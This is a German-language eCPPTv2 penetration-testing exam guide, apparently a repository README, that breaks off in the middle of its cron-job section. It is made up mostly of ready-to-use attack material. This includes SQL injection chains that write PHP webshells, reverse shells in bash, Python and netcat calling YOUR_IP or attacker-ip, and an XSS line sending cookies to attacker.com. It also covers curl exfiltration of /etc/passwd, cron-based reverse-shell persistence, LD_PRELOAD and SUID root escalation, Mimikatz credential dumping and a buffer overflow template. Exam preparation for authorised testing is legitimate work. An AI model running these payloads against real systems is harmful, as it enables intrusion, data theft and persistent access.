# ECPPT-eCPPTv2-Pr-fungsvorbereitung
# ECPPT (eCPPTv2) Prüfungsvorbereitung - Kompakt

## Prüfungsformat
- **Dauer**: 14 Tage (7 Tage Pentest + 7 Tage Report)
- **Netzwerk**: Mehrere vernetzte Maschinen (Pivot erforderlich)
- **Ziel**: Root/Administrator auf allen Systemen + professioneller Pentest-Report
- **Bestehen**: Mindestens alle Flags + qualitativ hochwertiger Report

## 1. Netzwerk & Pivoting

### Port Scanning durch Pivot
```bash
# Proxychains Setup
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf

# SSH Dynamic Port Forward
ssh -D 1080 user@pivot-host

# Nmap durch Proxy
proxychains nmap -sT -Pn target

# Chisel (besser als SSH)
# Auf Attacker:
./chisel server -p 8000 --reverse
# Auf Pivot:
./chisel client attacker-ip:8000 R:1080:socks
```

### Metasploit Pivoting
```bash
# Route hinzufügen
meterpreter> run autoroute -s 10.10.10.0/24

# SOCKS Proxy
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> run

# Port Forward
meterpreter> portfwd add -l 445 -p 445 -r target-ip
```

## 2. Web Application Exploitation

### SQL Injection
```sql
-- Authentication Bypass
' OR '1'='1' --
admin'--

-- UNION Injection
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--

-- Time-Based Blind
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- File Read (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--

-- Webshell Upload
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
```

### XSS & CSRF
```javascript
// XSS Cookie Steal
<script>document.location='http://attacker.com/?c='+document.cookie</script>

// CSRF Token Bypass
<img src="http://target.com/admin/delete?id=1" style="display:none">
```

### Command Injection
```bash
; ls
| cat /etc/passwd
`whoami`
$(cat /etc/shadow)
; nc -e /bin/bash attacker-ip 4444
```

### LFI/RFI
```bash
# LFI
?page=../../../../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/etc/passwd%00

# Log Poisoning
# In User-Agent: <?php system($_GET['cmd']); ?>
?page=/var/log/apache2/access.log&cmd=whoami

# RFI
?page=http://attacker.com/shell.txt
```

## 3. System Exploitation

### Windows Privilege Escalation
```powershell
# Enumeration
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo

# Unquoted Service Path
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows"

# Weak Service Permissions
accesschk.exe -uwcqv "Authenticated Users" *
sc config service binpath= "C:\shell.exe"
sc stop service
sc start service

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/meterpreter/reverse_tcp -f msi > shell.msi

# SeImpersonatePrivilege
# Potato Exploits: JuicyPotato, RoguePotato, PrintSpoofer
```

### Linux Privilege Escalation
```bash
# Enumeration
id
sudo -l
cat /etc/passwd
cat /etc/crontab
find / -perm -4000 2>/dev/null

# SUID Binary Exploitation
find / -perm -u=s 2>/dev/null
# GTFOBins für SUID Exploits nutzen

# Sudo Exploits
sudo -l
# Wenn (ALL : ALL) NOPASSWD: /bin/bash
sudo /bin/bash

# Cron Jobs
cat /etc/crontab
# Writable Script in Cron? Shell einfügen

# Kernel Exploits (letzter Ausweg)
uname -a
searchsploit linux kernel 4.4
```

## 4. Active Directory

### Enumeration
```powershell
# Domain Info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess

# BloodHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

### Kerberoasting
```bash
# GetUserSPNs
python GetUserSPNs.py domain/user:password -dc-ip DC-IP -request

# Crack Hash
hashcat -m 13100 hash.txt wordlist.txt

# PowerView
Get-NetUser -SPN | select serviceprincipalname
```

### Pass-the-Hash
```bash
# pth-winexe
pth-winexe -U domain/user%hash //target cmd

# Evil-WinRM
evil-winrm -i target-ip -u user -H hash

# Metasploit psexec
use exploit/windows/smb/psexec
set SMBUser user
set SMBPass hash
```

## 5. Buffer Overflow (x86)

### Workflow
1. **Fuzzing** - Crash finden
2. **Offset finden** - pattern_create, pattern_offset
3. **Bad Chars identifizieren** - \x00, \x0a, \x0d meist
4. **JMP ESP finden** - !mona jmp -r esp
5. **Shellcode generieren** - msfvenom
6. **Exploit bauen** - NOP Sled + Shellcode

### Exploit Template
```python
import socket

target = "192.168.1.100"
port = 9999

offset = 2003
bad_chars = "\x00\x0a\x0d"
jmp_esp = "\xaf\x11\x50\x62"  # Little Endian!

shellcode = (
"\x90" * 16 +  # NOP Sled
"SHELLCODE_HERE"
)

buffer = "A" * offset
buffer += jmp_esp
buffer += shellcode
buffer += "C" * (3000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(buffer)
s.close()
```

## 6. Post-Exploitation

### Credentials Dumping
```bash
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# Linux
cat /etc/shadow
unshadow passwd shadow > hashes
john hashes --wordlist=rockyou.txt
```

### Persistence
```bash
# Windows Registry
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Linux Cron
echo "* * * * * nc attacker-ip 4444 -e /bin/bash" > /tmp/cron
crontab /tmp/cron
```

## 7. Wichtige Tools

- **Nmap**: -sC -sV -p- --min-rate 1000
- **Gobuster**: dir -u URL -w wordlist -x php,html,txt
- **Burp Suite**: Proxy, Repeater, Intruder
- **SQLMap**: --dbs, --tables, --dump
- **Metasploit**: search, use, set, exploit
- **Netcat**: Listener nc -lvnp 4444
- **Python HTTP Server**: python3 -m http.server 80

## 8. Report-Struktur

1. **Executive Summary** (Management-Level)
2. **Technical Summary** (Technische Details)
3. **Findings** (Pro Vulnerability):
   - Risk Rating (Critical/High/Medium/Low)
   - Affected Systems
   - Proof of Concept
   - Impact
   - Remediation
4. **Appendix** (Screenshots, Outputs)

**Wichtig**: Professional, strukturiert, Screenshots mit Kommentaren!

## 9. Prüfungstipps

- **Dokumentiere alles sofort** - Screenshots, Commands, IPs
- **Methodisch vorgehen** - Enumeration → Exploitation → Post-Exploitation
- **Pivot nicht vergessen** - Meist mehrere Netzwerksegmente
- **Report ist 50%** - Investiere Zeit in professionelle Dokumentation
- **Pausen machen** - 14 Tage können mental anstrengend sein
- **Backup-Shells** - Immer mehrere Zugänge offen halten

Viel Erfolg bei der ECPPT!


# ECPPT - Vollständig Praktischer Leitfaden

## 1. RECONNAISSANCE & ENUMERATION

### 1.1 Initiales Network Scanning

**Erstes Nmap Scan (Quick)**
```bash
# Schneller Scan aller Ports
nmap -p- --min-rate=1000 -T4 192.168.1.100 -oN quick_scan.txt

# Warum diese Parameter?
# -p- = Alle 65535 Ports scannen
# --min-rate=1000 = Mindestens 1000 Pakete/Sekunde für Geschwindigkeit
# -T4 = Aggressives Timing
# -oN = Output in normale Textdatei
```

**Detaillierter Scan auf gefundene Ports**
```bash
# Beispiel: Ports 21,22,80,445 gefunden
nmap -p 21,22,80,445 -sV -sC -A 192.168.1.100 -oN detailed_scan.txt

# Was passiert hier?
# -sV = Version Detection (zeigt z.B. "Apache 2.4.41")
# -sC = Default NSE Scripts (findet oft Schwachstellen)
# -A = OS Detection, Traceroute, erweiterte Infos
```

**Praktisches Beispiel - Output interpretieren:**
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed
22/tcp  open  ssh         OpenSSH 7.6p1
80/tcp  open  http        Apache httpd 2.4.29
|_http-title: Welcome to Company X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

**Was du daraus machst:**
- Port 21: vsftpd 2.3.4 → Google nach "vsftpd 2.3.4 exploit"
- Port 21: Anonymous Login → Verbinden und erkunden!
- Port 80: Webserver → Gobuster/Nikto starten
- Port 445: Samba → Enum4linux, smbclient nutzen

### 1.2 FTP Enumeration (Port 21)

**Anonymous Login testen:**
```bash
ftp 192.168.1.100
# Username: anonymous
# Password: [Enter drücken oder "anonymous"]

# Wenn erfolgreich:
ftp> ls -la          # Alle Dateien anzeigen
ftp> cd /pub         # In Verzeichnisse wechseln
ftp> get backup.zip  # Dateien herunterladen
ftp> binary          # Für Binärdateien
ftp> get database.sql
ftp> quit

# Alternative mit wget (rekursiv alles herunterladen):
wget -r ftp://anonymous:anonymous@192.168.1.100/
```

**Heruntergeladene Dateien analysieren:**
```bash
# ZIP Files entpacken
unzip backup.zip

# SQL Dumps nach Credentials durchsuchen
cat database.sql | grep -i password
cat database.sql | grep -i user

# Interessante Infos:
# - Usernames
# - Password Hashes
# - Email Adressen
# - Interne Pfade/Struktur
```

### 1.3 SMB/Samba Enumeration (Port 445)

**Enum4linux - Komplette SMB Enumeration:**
```bash
enum4linux -a 192.168.1.100

# Was macht -a?
# - User Enumeration
# - Share Enumeration
# - Group Information
# - Password Policy
# - OS Information
```

**SMB Shares manuell erkunden:**
```bash
# Shares auflisten
smbclient -L //192.168.1.100 -N

# Output Beispiel:
# Sharename       Type      Comment
# ---------       ----      -------
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share
# IPC$            IPC       Remote IPC
# backups         Disk      Old Backups

# Auf Share zugreifen (ohne Passwort):
smbclient //192.168.1.100/backups -N

# Im SMB Prompt:
smb: \> ls                    # Dateien auflisten
smb: \> cd folder             # Verzeichnis wechseln
smb: \> get credentials.txt   # Datei herunterladen
smb: \> mget *                # Alle Dateien herunterladen
smb: \> exit

# Mit Credentials:
smbclient //192.168.1.100/backups -U username%password
```

**Recursiv alle Files herunterladen:**
```bash
smbget -R smb://192.168.1.100/backups -U username%password
```

### 1.4 Web Enumeration (Port 80/443)

**Gobuster - Directory Bruteforce:**
```bash
# Standard Directory Scan
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,zip,bak -t 50

# Parameter erklärt:
# dir = Directory bruteforce mode
# -u = URL
# -w = Wordlist
# -x = Extensions to check
# -t = Threads (50 = schnell)

# Output Beispiel:
# /admin                (Status: 301)
# /uploads              (Status: 200)
# /backup.zip           (Status: 200)
# /config.php.bak       (Status: 200)

# Fortgeschrittener Scan mit spezifischer Wordlist:
gobuster dir -u http://192.168.1.100 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html,zip,bak,old,config -t 100 -b 404,403
```

**Nikto - Vulnerability Scanner:**
```bash
nikto -h http://192.168.1.100

# Findet:
# - Veraltete Software
# - Bekannte Schwachstellen
# - Unsichere Konfigurationen
# - Interessante Verzeichnisse
```

**WhatWeb - Technology Detection:**
```bash
whatweb http://192.168.1.100 -v

# Zeigt:
# - CMS (WordPress, Joomla, etc.)
# - Server Version
# - Frameworks
# - JavaScript Libraries
```

**Wenn WordPress gefunden:**
```bash
wpscan --url http://192.168.1.100 --enumerate u,vp,vt

# u = Users
# vp = Vulnerable Plugins
# vt = Vulnerable Themes

# Mit API Token (bessere Ergebnisse):
wpscan --url http://192.168.1.100 --api-token YOUR_TOKEN --enumerate ap
```

### 1.5 Manuelle Web-Analyse

**Browser Reconnaissance:**
```
1. Seite öffnen und durchklicken
2. Rechtsklick → "Seitenquelltext anzeigen"
3. Nach Kommentaren suchen: <!-- --> 
4. JavaScript Dateien analysieren
5. Robots.txt checken: http://target/robots.txt
6. Sitemap.xml checken: http://target/sitemap.xml
```

**Burp Suite einrichten:**
```
1. Burp Suite starten
2. Proxy → Options → Interface: 127.0.0.1:8080
3. Browser Proxy einstellen: 127.0.0.1:8080
4. Burp Certificate installieren
5. Intercept: ON
6. Jetzt alle Requests sehen und manipulieren
```

**Burp Suite Workflow:**
```
1. Site mappen: Target → Site map
2. Spider laufen lassen: Rechtsklick → Spider this host
3. Interessante Requests in Repeater senden (Ctrl+R)
4. Im Repeater: Request modifizieren → Send
5. Response analysieren
```

---

## 2. WEB APPLICATION ATTACKS

### 2.1 SQL Injection - Von Null bis Shell

**Phase 1: Injection Point finden**

```bash
# URL Parameter testen
http://target.com/product.php?id=1'
http://target.com/product.php?id=1"
http://target.com/product.php?id=1 OR 1=1--
http://target.com/product.php?id=1 AND 1=1--
http://target.com/product.php?id=1 AND 1=2--

# Login Form testen
Username: admin'--
Password: [egal]

Username: ' OR '1'='1
Password: ' OR '1'='1

Username: admin' OR 1=1#
Password: [egal]
```

**Erkennungszeichen für SQL Injection:**
- Error Messages: "SQL syntax error"
- Unterschiedliche Responses bei 1=1 vs 1=2
- Leere/volle Seiten je nach Input
- Verzögerte Response bei SLEEP() Tests

**Phase 2: UNION Injection - Spaltenanzahl ermitteln**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--

# Wenn ORDER BY 4 funktioniert, aber ORDER BY 5 Error gibt:
# → Tabelle hat 4 Spalten

# Dann UNION nutzen:
' UNION SELECT NULL,NULL,NULL,NULL--

# Welche Spalte wird angezeigt? Zahlen einsetzen:
' UNION SELECT 1,2,3,4--

# Output: "2" und "3" werden auf der Seite angezeigt
# → Wir können in Spalte 2 und 3 Daten ausgeben
```

**Phase 3: Datenbank enumerieren**

```sql
# Datenbankname
' UNION SELECT 1,database(),3,4--

# Datenbank Version
' UNION SELECT 1,@@version,3,4--

# Alle Tabellen anzeigen
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--

# Output z.B.: "users,products,orders,admin_users"

# Spalten der 'users' Tabelle anzeigen
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--

# Output z.B.: "id,username,password,email"
```

**Phase 4: Credentials extrahieren**

```sql
# Alle User Daten
' UNION SELECT 1,group_concat(username,':',password),3,4 FROM users--

# Output z.B.:
# admin:5f4dcc3b5aa765d61d8327deb882cf99
# john:e10adc3949ba59abbe56e057f20f883e
# alice:25d55ad283aa400af464c76d713c07ad

# Einzelne Einträge
' UNION SELECT 1,username,password,4 FROM users LIMIT 0,1--
' UNION SELECT 1,username,password,4 FROM users LIMIT 1,1--
```

**Phase 5: Hashes cracken**

```bash
# MD5 Hashes erkennen (32 Zeichen)
# Online: https://crackstation.net/
# Oder mit John:

echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Oder Hashcat:
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Ergebnis z.B.: password, 123456, qwerty
```

**Phase 6: File System Access (MySQL)**

```sql
# Dateien lesen
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4--
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4--

# Config Files die du suchen solltest:
' UNION SELECT 1,LOAD_FILE('/var/www/html/wp-config.php'),3,4--
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4--
' UNION SELECT 1,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),3,4--
```

**Phase 7: Webshell hochladen**

```sql
# Webshell Code (simpel):
<?php system($_GET['cmd']); ?>

# In Datei schreiben (benötigt Schreibrechte):
' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4 INTO OUTFILE '/var/www/html/shell.php'--

# Oder komplexere Shell:
' UNION SELECT 1,"<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>",3,4 INTO OUTFILE '/var/www/html/cmd.php'--

# Shell aufrufen:
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=id
http://target.com/shell.php?cmd=ls -la
http://target.com/shell.php?cmd=cat /etc/passwd
```

**Wichtige Pfade für OUTFILE:**
```
/var/www/html/shell.php          (Standard Linux)
/var/www/html/uploads/shell.php  (Uploads Folder oft beschreibbar)
C:\xampp\htdocs\shell.php        (Windows XAMPP)
C:\wamp\www\shell.php            (Windows WAMP)
C:\inetpub\wwwroot\shell.php     (Windows IIS)
```

**Phase 8: Reverse Shell bekommen**

```bash
# 1. Netcat Listener starten
nc -lvnp 4444

# 2. Via Webshell Reverse Shell triggern
http://target.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# URL-encoded:
http://target.com/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%27

# Alternative mit Python:
http://target.com/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Alternative mit Netcat:
http://target.com/shell.php?cmd=nc YOUR_IP 4444 -e /bin/bash

# Alternative mit Netcat ohne -e:
http://target.com/shell.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
```

**SQLMap - Automatisierter Ansatz:**

```bash
# URL testen
sqlmap -u "http://target.com/product.php?id=1" --batch

# Datenbanken auflisten
sqlmap -u "http://target.com/product.php?id=1" --dbs

# Tabellen einer DB auflisten
sqlmap -u "http://target.com/product.php?id=1" -D database_name --tables

# Spalten einer Tabelle
sqlmap -u "http://target.com/product.php?id=1" -D database_name -T users --columns

# Daten dumpen
sqlmap -u "http://target.com/product.php?id=1" -D database_name -T users --dump

# OS Shell bekommen (wenn möglich)
sqlmap -u "http://target.com/product.php?id=1" --os-shell

# POST Request mit SQLMap:
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --batch

# Mit Cookie:
sqlmap -u "http://target.com/profile.php?id=1" --cookie="PHPSESSID=abc123" --batch
```

### 2.2 Command Injection

**Injection Points finden:**

```bash
# URL Parameter
http://target.com/ping.php?ip=127.0.0.1

# POST Data
ip=127.0.0.1

# HTTP Headers
User-Agent: () { :; }; /bin/bash -c 'commands'
```

**Injection Payloads testen:**

```bash
# Basic Tests
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
`whoami`
$(whoami)

# Mit Encoding falls gefiltert
127.0.0.1%3Bwhoami
127.0.0.1%0Awhoami

# Blind Detection
127.0.0.1; sleep 5
127.0.0.1 && ping -c 10 YOUR_IP
```

**Exploitation:**

```bash
# 1. Basic Enumeration
127.0.0.1; id
127.0.0.1; uname -a
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la /home

# 2. Reverse Shell
# Listener starten:
nc -lvnp 4444

# Payload:
127.0.0.1; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
127.0.0.1; nc YOUR_IP 4444 -e /bin/bash
127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# 3. Data Exfiltration (wenn keine Shell möglich)
127.0.0.1; cat /etc/passwd | curl -d @- http://YOUR_IP:8000/
```

### 2.3 Local File Inclusion (LFI)

**Basic LFI Testing:**

```bash
# Einfache Tests
http://target.com/index.php?page=../../../../../etc/passwd
http://target.com/index.php?page=../../../../../../etc/passwd
http://target.com/index.php?page=....//....//....//....//etc/passwd

# Null Byte (PHP < 5.3)
http://target.com/index.php?page=../../../../../etc/passwd%00
http://target.com/index.php?page=../../../../../etc/passwd%00.jpg

# Encoding
http://target.com/index.php?page=..%2f..%2f..%2f..%2fetc%2fpasswd
http://target.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
```

**Interessante Dateien (Linux):**

```bash
/etc/passwd              # User accounts
/etc/shadow              # Password hashes (wenn readable)
/etc/group               # Groups
/etc/hosts               # Host file
/etc/issue               # OS version
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/www/html/config.php
/home/user/.ssh/id_rsa   # SSH Private Keys
/home/user/.bash_history # Command history
/proc/self/environ       # Environment variables
/proc/self/cmdline       # Command line
```

**Interessante Dateien (Windows):**

```bash
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\xampp\htdocs\config.php
C:\inetpub\wwwroot\web.config
```

**Log Poisoning → RCE:**

```bash
# 1. Access Log Lokation finden
http://target.com/index.php?page=../../../../../var/log/apache2/access.log

# 2. User-Agent mit PHP Code poisonen
# In Burp oder curl:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 3. Log File includen und Command ausführen
http://target.com/index.php?page=../../../../../var/log/apache2/access.log&cmd=whoami

# 4. Reverse Shell
http://target.com/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash -c 'bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261'
```

**SSH Log Poisoning:**

```bash
# 1. SSH mit Payload als Username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# 2. Log includen (falls readable)
http://target.com/index.php?page=../../../../../var/log/auth.log&cmd=whoami
```

**PHP Wrappers:**

```bash
# Base64 encode file content
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php

# Response decodieren:
echo "BASE64_OUTPUT" | base64 -d

# Expect Wrapper (wenn installiert)
http://target.com/index.php?page=expect://whoami

# Data Wrapper
http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=whoami
# Base64: <?php system($_GET['cmd']); ?>
```

### 2.4 File Upload Vulnerabilities

**Phase 1: Upload Point finden**

```
- Profilbilder
- Document Uploads
- Avatar Upload
- Attachment Features
```

**Phase 2: Upload Restrictions testen**

```bash
# 1. Normale PHP Shell versuchen
<?php system($_GET['cmd']); ?>
# Speichern als: shell.php

# 2. Falls blockiert, Extensions testen:
shell.php
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar
shell.phpt

# 3. Doppelte Extension
shell.php.jpg
shell.jpg.php

# 4. Null Byte (alte PHP Versionen)
shell.php%00.jpg
shell.php\x00.jpg

# 5. Case Manipulation
shell.PhP
shell.pHp

# 6. Trailing Spaces/Dots (Windows)
shell.php....
shell.php[SPACE]
```

**Phase 3: Content-Type Bypass**

```
In Burp Suite Request ändern:

Content-Type: image/jpeg
zu:
Content-Type: application/x-php

Oder umgekehrt:
Content-Type: application/x-php
zu:
Content-Type: image/jpeg
```

**Phase 4: Magic Bytes hinzufügen**

```bash
# PHP Shell mit GIF Header
GIF89a;
<?php system($_GET['cmd']); ?>

# Speichern als: shell.php.gif

# Oder in Hex Editor:
# GIF: 47 49 46 38 39 61
# PNG: 89 50 4E 47
# JPG: FF D8 FF E0
```

**Phase 5: Upload Location finden**

```bash
# Typische Upload Pfade:
/uploads/shell.php
/upload/shell.php
/files/shell.php
/images/shell.php
/media/shell.php
/assets/shell.php
/content/shell.php
/data/shell.php

# Mit Gobuster automatisiert:
gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt
```

**Phase 6: Shell ausführen**

```bash
# Shell aufrufen:
http://target.com/uploads/shell.php?cmd=whoami
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=cat /etc/passwd

# Reverse Shell:
http://target.com/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

**Diverse PHP Shells:**

```php
# Minimale Shell
<?php system($_GET['c']); ?>

# Mit Output
<?php echo shell_exec($_GET['cmd']); ?>

# Interaktive Shell
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

# Reverse Shell direkt im Upload
<?php
$sock=fsockopen("YOUR_IP",4444);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

**Pentestmonkey Reverse Shell (empfohlen):**

```bash
# Download:
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

# Editieren:
$ip = 'YOUR_IP';
$port = 4444;

# Upload und ausführen
# Listener: nc -lvnp 4444
```

---

## 3. LINUX PRIVILEGE ESCALATION

### 3.1 Enumeration nach Shell-Erhalt

**Basic Info sammeln:**

```bash
# Wer bin ich?
id
whoami
groups

# Welches System?
uname -a
cat /etc/issue
cat /etc/*-release
lsb_release -a

# Kernel Version (für Exploits wichtig)
uname -r

# Welche User gibt es?
cat /etc/passwd
cat /etc/passwd | grep -v nologin | grep -v false

# Aktive Prozesse
ps aux
ps aux | grep root

# Netzwerk
ifconfig
ip a
netstat -antup
ss -tulpn
```

**Automatisierte Enumeration:**

```bash
# LinPEAS (stark empfohlen!)
# Auf Attacker:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80

# Auf Victim:
cd /tmp
wget http://YOUR_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Oder direkt:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget http://YOUR_IP/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration
wget http://YOUR_IP/lse.sh
chmod +x lse.sh
./lse.sh -l 1  # Level 1 (schnell)
./lse.sh -l 2  # Level 2 (detailed)
```

### 3.2 SUID Binaries

**SUID Dateien finden:**

```bash
# Alle SUID Binaries
find / -perm -u=s -type f 2>/dev/null

# Oder
find / -perm -4000 -type f 2>/dev/null

# Output z.B.:
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find      ← Interessant!
/usr/bin/vim       ← Interessant!
/usr/bin/python3   ← Jackpot!
/usr/bin/systemctl ← Interessant!
```

**GTFOBins nutzen:**

Gehe zu: https://gtfobins.github.io/

**Beispiel: /usr/bin/find mit SUID:**

```bash
# Check ob SUID:
ls -la /usr/bin/find
# Output: -rwsr-xr-x ... (das 's' ist wichtig!)

# Exploit (von GTFOBins):
/usr/bin/find . -exec /bin/bash -p \; -quit

# Du bist jetzt root!
```

**Beispiel: /usr/bin/python3 mit SUID:**

```bash
/usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

**Beispiel: /usr/bin/vim mit SUID:**

```bash
vim -c ':!/bin/bash'
# Oder im vim:
:set shell=/bin/bash
:shell
```

**Beispiel: /usr/bin/systemctl mit SUID:**

```bash
# Service File erstellen
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > /tmp/root.service

# Service enablen und starten
/usr/bin/systemctl link /tmp/root.service
/usr/bin/systemctl enable --now /tmp/root.service

# SUID bash nutzen
/bin/bash -p
```

**Custom SUID Binary:**

```bash
# Wenn du ein unbekanntes SUID Binary findest:
strings /pfad/zur/binary

# Suche nach:
# - system() calls
# - Relative Pfade (z.B. "ls" statt "/bin/ls")

# Beispiel: Binary führt "ls" ohne vollen Pfad aus
# PATH Hijacking:
cd /tmp
echo '/bin/bash' > ls
chmod +x ls
export PATH=/tmp:$PATH
/pfad/zur/vulnerable_binary
```

### 3.3 Sudo Rechte

**Sudo Rechte checken:**

```bash
sudo -l

# Output Beispiel:
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
    (ALL : ALL) /usr/bin/python3
```

**NOPASSWD Exploits:**

```bash
# Fall 1: sudo find
sudo find . -exec /bin/bash \; -quit

# Fall 2: sudo vim
sudo vim -c ':!/bin/bash'

# Fall 3: sudo python
sudo python -c 'import os; os.system("/bin/bash")'

# Fall 4: sudo less
sudo less /etc/profile
# Dann: !/bin/bash

# Fall 5: sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# Fall 6: sudo nmap (alte Versionen)
sudo nmap --interactive
nmap> !sh

# Fall 7: sudo apache2
sudo apache2 -f /etc/shadow
# Gibt Shadow-File aus als "Error"
```

**LD_PRELOAD Exploit:**

```bash
# Wenn sudo -l zeigt: env_keep+=LD_PRELOAD

# 1. C Code erstellen (shell.c):
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# 2. Kompilieren:
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# 3. Exploit:
sudo LD_PRELOAD=/tmp/shell.so <any_sudo_command>
# Beispiel:
sudo LD_PRELOAD=/tmp/shell.so find
```

### 3.4 Cron Jobs

**Cron Jobs finden:**

```bash
# System-wide Cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/
cat /etc/cron.d/*

# User Crons
crontab -l
cat /var/spool/cron/crontabs/*

# Running processes (pspy)
# Download pspy64:
wget http://YOUR_IP/pspy64
chmod +x pspy64
./pspy64

# Zeigt alle gestarteten Prozesse in Echtzeit!
```

**Writable Cron Script exploiten:**

```bash
# Beispiel: /etc/crontab zeigt:
* * * * * root /usr/local/bin/backup.sh

# Check Permissions:
ls -la /usr/local/bin/backup.sh
# Output: -rwxrwxrwx (writable by everyone!)

# Exploit:
echo '#!/bin/bash' > /usr/local/bin/backup.sh
